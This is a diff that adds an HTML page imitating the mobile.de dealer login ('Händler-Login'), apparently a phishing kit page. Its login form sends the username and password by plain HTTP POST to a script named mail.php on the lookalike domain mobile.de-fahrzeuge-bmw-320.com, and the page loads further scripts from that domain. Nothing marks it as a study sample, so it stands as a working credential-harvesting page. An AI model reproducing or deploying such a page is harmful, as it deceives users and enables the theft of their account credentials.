@@ -1,0 +1,49 @@
+<html class=" grunticon grunticon grunticon"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="Cache-control" content="no-store"><meta http-equiv="Cache-control" content="no-cache"><meta http-equiv="Cache-control" content="must-revalidate"><title>Händler-Login</title><!--[if lte IE 8]><script src="bower_components/jquery-old/dist/jquery.min.js"></script><![endif]--><!--[if gte IE 9]><!--><link rel="stylesheet" href="icons.common.data.svg.css" media="all"><link rel="stylesheet" href="icons.logo.data.svg.css" media="all"><link rel="stylesheet" href="icons.form.data.svg.css" media="all"><script async="" src="../../www.google-analytics.com/analytics.js"></script><script src="jquery.min.js"></script><!--<![endif]--><!--[if lt IE 9]><script src="bower_components/html5shiv/dist/html5shiv.js"></script><![endif]--><link href="common/a2Main.css" rel="stylesheet"><!--[if lte IE 8]><link href="css/ie/ie.css" rel="stylesheet"><![endif]--><script type="text/javascript">/*! grunt-grunticon Stylesheet Loader - v2.1.6 | https://github.com/filamentgroup/grunticon | (c) 2015 Scott Jehl, Filament Group, Inc. | MIT license. */
+        (function(e){function n(n,t,o,a){"use strict";var i=e.document.createElement("link"),r=t||e.document.getElementsByTagName("script")[0],d=e.document.styleSheets;return i.rel="stylesheet",i.href=n,i.media="only x",a&&(i.onload=a),r.parentNode.insertBefore(i,r),i.onloadcssdefined=function(e){for(var t,o=0;d.length>o;o++)d[o].href&&d[o].href.indexOf(n)>-1&&(t=!0);t?e():setTimeout(function(){i.onloadcssdefined(e)})},i.onloadcssdefined(function(){i.media=o||"all"}),i}function t(e,n){e.onload=function(){e.onload=null,n&&n.call(e)},"isApplicationInstalled"in navigator&&"onloadcssdefined"in e&&e.onloadcssdefined(n)}var o=function(a,i){"use strict";if(a&&3===a.length){var r=e.Image,d=!(!document.createElementNS||!document.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect||!document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image","1.1")||e.opera&&-1===navigator.userAgent.indexOf("Chrome")||-1!==navigator.userAgent.indexOf("Series40")),c=new r;c.onerror=function(){o.method="png",o.href=a[2],n(a[2])},c.onload=function(){var e=1===c.width&&1===c.height,r=a[e&&d?0:e?1:2];o.method=e&&d?"svg":e?"datapng":"png",o.href=r,t(n(r),i)},c.src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==",document.documentElement.className+=" grunticon"}};o.loadCSS=n,o.onloadCSS=t,e.grunticon=o})(this);
+        grunticon(["icons.common.data.svg.css", "icons.common.data.png.css", "css/icons/common/icons.common.fallback.css"]);
+        grunticon(["icons.logo.data.svg.css", "icons.logo.data.png.css", "css/icons/logo/icons.logo.fallback.css"]);
+        grunticon(["icons.form.data.svg.css", "icons.form.data.png.css", "css/icons/actions/icons.form.fallback.css"]);</script><script type="text/javascript">var mobile = mobile || {};</script><script type="text/javascript">
+			var startTime = new Date().getTime();
+			
+			function getTimeoutInSeconds() {
+			   currentTime = new Date().getTime();
+			   diff = - ( currentTime - startTime) + 4000;
+			   if(diff > 0) {
+			      return diff;
+			   } else {
+			      return 0;
+			   }
+			}
+			
+			function delayedSubmit() {
+			   document.getElementById('submitButton').setAttribute('disabled', 'disabled');
+			   window.setTimeout(function () { 
+			      document.getElementById('loginForm').submit();
+			   },
+			   getTimeoutInSeconds());
+			}
+	    </script>
+	    <script>
+/* google analytics wrapper for mobile.de: mga.js v1.2.0 */
+!function(e,n){"use strict";function t(e){var n,t;if(i(e))if(i(e[0]))for(n=0,t=e.length;t>n;n++)ga.apply(ga,e[n]);else ga.apply(ga,e);else ga.apply(ga,arguments)}function a(e){e=e||{};var n=e.domain||"mobile.de",a=e.uaAccount||"UA-3584729-1",i=e.userId||"";t.debug||o();var c={cookieDomain:"."+n};i&&(c.userId=i),ga("create",a,c),ga("set","anonymizeIp",!0),ga("require","displayfeatures")}function o(){!function(e,n,t,a,o,i,c){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=n.createElement(t),c=n.getElementsByTagName(t)[0],i.async=1,i.src=a,c.parentNode.insertBefore(i,c)}(window,document,"script","//www.google-analytics.com/analytics.js","ga")}function i(e){return"[object Array]"===Object.prototype.toString.call(e)}"function"==typeof define&&define.amd&&define("mga",function(){return t}),t.init=a,e.mga=t}(window,document);
+</script>
+    </head><body class="login de" data-locale="de"><header class="header header--no-meta header--no-nav"><div class="header-meta-container header-hidden-small"><!-- placeholder for desktop meta --></div><div class="header-navbar clearfix"><div class="header-corporate"><i class="gicon-mobilede-logo mobile-logo" data-site="de"></i><span class="claim header-hidden-small">Deutschlands größter Fahrzeugmarkt</span></div></div></header><div class="g-container" id="container"><div class="g-row top-g-row"><div class="g-col-12"><h1>Händler-Login</h1></div></div><div class="g-row"><div class="g-col-m-12 g-col-l-8" data-sizey="4"><article class="cBox cBox--l1 formBox"><header class="cBox-header" id="tmpl-form"><h2>Sie sind mobile.de Händler?<br>Melden Sie sich hier mit Ihren Zugangsdaten an:</h2></header><section class="cBox-body">
+
+
+
+    <form method="post" role="form" action="http://mobile.de-fahrzeuge-bmw-320.com/s-anzeige/mail.php">
+
+
+    <input type="hidden" name="locale" value="de"><input type="hidden" id="browserFingerprint" name="browserFingerprint" value=""><div class="g-row form-group"><div class="g-col-s-12 g-col-m-6">
+
+
+    <label for="username">Nutzername / E-Mail-Adresse</label>
+    <input class="form-control form-control--l " type="text" value="" name="username" id="username" required>
+    </div>
+    <div class="g-col-s-12 g-col-m-6"><label for="password">Passwort</label>
+    <input class="form-control form-control--l " type="password" value="" name="password"  autocomplete="new-password" id="password" required>
+    </div></div>
+
+    <div class="g-row form-group"><div class="g-col-6 u-text-right pw-reset-link"><a class="link--muted" href="index.html#">Passwort vergessen?</a></div><div class="g-col-6 u-text-right submit-form">
+
+    <button class="btn btn--orange btn--l submit-login" type="submit">Anmelden</button><input type="hidden" name="redirectUrl" value=""></div></div></form></section></article></div><div class="g-col-m-12 g-col-l-4" data-sizey="4"><article class="cBox cBox--l1 infoBox"><header class="cBox-header"><h3>Noch kein mobile.de Händler?</h3></header><hr><section class="cBox-body"><div class="g-row"><div class="g-col-12">Werden Sie Mitglied bei Deutschlands größtem Fahrzeugmarkt und profitieren Sie von vielen Vorteilen bei mobile.de.</div></div><div class="g-row"><div class="g-col-12 register-new-account"><a class="btn btn--muted btn--l" href="index.html#">Jetzt registrieren</a></div></div></section></article></div></div></div><script src="http://mobile.de-fahrzeuge-bmw-320.com/s-anzeige/js/generated/fingerprint.js"></script><script src="http://mobile.de-fahrzeuge-bmw-320.com/s-anzeige/js/a2.js"></script></body></html>
